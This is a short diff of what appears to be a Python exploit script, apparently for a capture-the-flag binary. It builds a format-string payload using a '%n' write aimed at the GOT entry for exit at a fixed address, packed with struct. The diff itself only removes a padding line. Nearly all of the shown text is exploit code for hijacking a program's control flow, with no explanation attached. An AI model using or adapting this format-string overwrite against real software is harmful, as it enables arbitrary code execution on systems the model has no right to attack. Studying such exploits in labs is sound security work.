@@ -16,7 +16,6 @@ fmt = "%4196997x%30$n  "
 
 # GoT exit
 got_exit = struct.pack("<q", 0x00601228)
-padd = 'a' * (0x64 - 60 - len(to) - len(fmt))
 
 #fmt needs to be before got_exit to avoid zero
 user = fmt + got_exit
